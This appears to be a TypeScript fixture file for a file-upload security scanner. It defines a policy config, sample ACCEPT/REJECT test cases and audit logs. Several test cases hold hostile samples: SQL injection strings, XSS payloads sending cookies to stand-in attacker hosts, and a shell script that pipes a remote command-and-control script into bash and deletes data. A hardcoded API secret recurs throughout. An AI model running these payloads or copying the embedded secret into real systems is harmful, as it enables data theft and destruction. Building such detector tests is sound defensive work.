import { SampleTestCase, SecurityPolicyConfig, AuditLogEntry } from './types';

export const DEFAULT_POLICY_CONFIG: SecurityPolicyConfig = {
  maxFileSizeBytes: 5 * 1024 * 1024, // 5 MB
  allowedExtensions: ['.json', '.csv', '.xml', '.txt', '.pdf', '.yaml', '.yml'],
  requireSignature: false,
  strictSchema: true,
  detectSqlInjection: true,
  detectXss: true,
  detectMalware: true,
  rateLimitRpm: 60,
  aiStrictness: 'BALANCED',
  apiKeySecret: 'pushguard_secret_key_2026',
};

export const SAMPLE_TEST_CASES: SampleTestCase[] = [
  {
    id: 'valid-json-order',
    title: 'Valid E-Commerce Order Batch (JSON)',
    description: 'Clean JSON batch containing structured orders with valid types and required customer fields.',
    fileName: 'order_batch_2026_08_03.json',
    mimeType: 'application/json',
    expectedDecision: 'ACCEPT',
    apiKey: 'pushguard_secret_key_2026',
    signature: '7e2f18391b00e2389a918a38f32bc181e14917482811a21f71a931182390a129',
    fileContent: JSON.stringify(
      {
        batchId: 'BATCH-994102',
        timestamp: '2026-08-03T02:40:00Z',
        sourceSystem: 'Shopify-Sync-Service',
        orders: [
          {
            orderId: 'ORD-1001',
            customerName: 'Alice Smith',
            email: 'alice.smith@example.com',
            amountUSD: 149.99,
            itemCount: 3,
            status: 'PENDING',
          },
          {
            orderId: 'ORD-1002',
            customerName: 'Robert Johnson',
            email: 'robert.j@example.org',
            amountUSD: 89.5,
            itemCount: 1,
            status: 'PENDING',
          },
        ],
      },
      null,
      2
    ),
  },
  {
    id: 'sql-injection-payload',
    title: 'SQL Injection Payload Attack (JSON)',
    description: 'Attempts classic SQL injection tricks inside customer query parameters (`OR 1=1; DROP TABLE users;`).',
    fileName: 'user_import_batch.json',
    mimeType: 'application/json',
    expectedDecision: 'REJECT',
    apiKey: 'pushguard_secret_key_2026',
    fileContent: JSON.stringify(
      {
        batchId: 'USER-BATCH-002',
        source: 'external_partner_push',
        users: [
          {
            userId: "101'; DROP TABLE users; --",
            username: "admin' OR '1'='1",
            email: 'attacker@malicious.domain',
            role: 'SUPERADMIN',
          },
        ],
      },
      null,
      2
    ),
  },
  {
    id: 'malformed-schema-nulls',
    title: 'Malformed JSON & Missing Schema Fields',
    description: 'Incomplete payload missing mandatory fields (`orderId`, `email`) and invalid null amounts.',
    fileName: 'broken_payload.json',
    mimeType: 'application/json',
    expectedDecision: 'REJECT',
    apiKey: 'pushguard_secret_key_2026',
    fileContent: JSON.stringify(
      {
        batchId: 'INCOMPLETE-001',
        orders: [
          {
            // Missing orderId
            customerName: null, // Invalid null
            amountUSD: 'one-hundred', // Type mismatch: string instead of float
          },
        ],
      },
      null,
      2
    ),
  },
  {
    id: 'xss-script-injection',
    title: 'Cross-Site Scripting (XSS) Payload',
    description: 'Injects malicious `<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>` into user comments.',
    fileName: 'feedback_tickets.json',
    mimeType: 'application/json',
    expectedDecision: 'REJECT',
    apiKey: 'pushguard_secret_key_2026',
    fileContent: JSON.stringify(
      {
        ticketId: 'TCK-8812',
        submittedBy: 'Anonymous',
        userComment:
          'Great service! <script>fetch("https://evil.site/steal?c="+document.cookie)</script><img src=x onerror=alert(1)>',
      },
      null,
      2
    ),
  },
  {
    id: 'valid-csv-financials',
    title: 'Valid CSV Financial Report (CSV)',
    description: 'Clean tabular CSV record containing daily balance reconciliation.',
    fileName: 'daily_reconciliation_2026.csv',
    mimeType: 'text/csv',
    expectedDecision: 'ACCEPT',
    apiKey: 'pushguard_secret_key_2026',
    fileContent: `transaction_id,account_number,amount,currency,status,timestamp
TXN-90112,ACC-449102,12500.00,USD,COMPLETED,2026-08-03T01:15:00Z
TXN-90113,ACC-882104,-350.75,USD,COMPLETED,2026-08-03T01:22:10Z
TXN-90114,ACC-102941,9400.20,EUR,PENDING,2026-08-03T01:30:00Z`,
  },
  {
    id: 'executable-binary-disguised',
    title: 'Disguised Executable / Shell Script (.exe/.sh)',
    description: 'Disguised shell script with dangerous system execution commands (`rm -rf /` / `powershell Invoke-WebRequest`).',
    fileName: 'update_patch.json.exe',
    mimeType: 'application/octet-stream',
    expectedDecision: 'REJECT',
    apiKey: 'pushguard_secret_key_2026',
    fileContent: `#!/bin/bash
echo "Executing payload..."
curl -s http://malicious-command-control.ru/bot.sh | bash
rm -rf /var/data/*`,
  },
];

export const INITIAL_AUDIT_LOGS: AuditLogEntry[] = [
  {
    auditId: 'AUD-20260803-01',
    timestamp: '2026-08-03T02:35:10Z',
    fileName: 'order_batch_2026_08_03.json',
    fileSizeBytes: 420,
    mimeType: 'application/json',
    decision: 'ACCEPT',
    overallRiskScore: 4,
    threatCategories: [],
    executionTimeMs: 142,
    clientIp: '192.168.1.45',
    reasoning: 'Payload passed all security checks. Schema validated against Pydantic model. HMAC signature verified successfully.',
    fileChecksumMd5: 'a8f5e12bc490d18e38101292a18811cf',
  },
  {
    auditId: 'AUD-20260803-02',
    timestamp: '2026-08-03T02:22:04Z',
    fileName: 'user_import_batch.json',
    fileSizeBytes: 310,
    mimeType: 'application/json',
    decision: 'REJECT',
    overallRiskScore: 95,
    threatCategories: ['SQL_INJECTION', 'SCHEMA_VIOLATION'],
    executionTimeMs: 88,
    clientIp: '10.0.4.19',
    reasoning: 'BLOCKED: Detected SQL injection attempt (`DROP TABLE users`) in field `userId` and boolean bypass string in `username`.',
    fileChecksumMd5: '3c9818812a0f82d1920231908aa19221',
  },
  {
    auditId: 'AUD-20260803-03',
    timestamp: '2026-08-03T02:05:18Z',
    fileName: 'update_patch.json.exe',
    fileSizeBytes: 1048,
    mimeType: 'application/octet-stream',
    decision: 'REJECT',
    overallRiskScore: 100,
    threatCategories: ['MALICIOUS_FILE_TYPE', 'COMMAND_INJECTION'],
    executionTimeMs: 45,
    clientIp: '185.220.101.5',
    reasoning: 'BLOCKED: Disguised binary/script extension (`.exe`) violating allowed MIME policy. Shell pipe to `bash` detected.',
    fileChecksumMd5: '9f2108043b8c0919283188d291083921',
  },
];
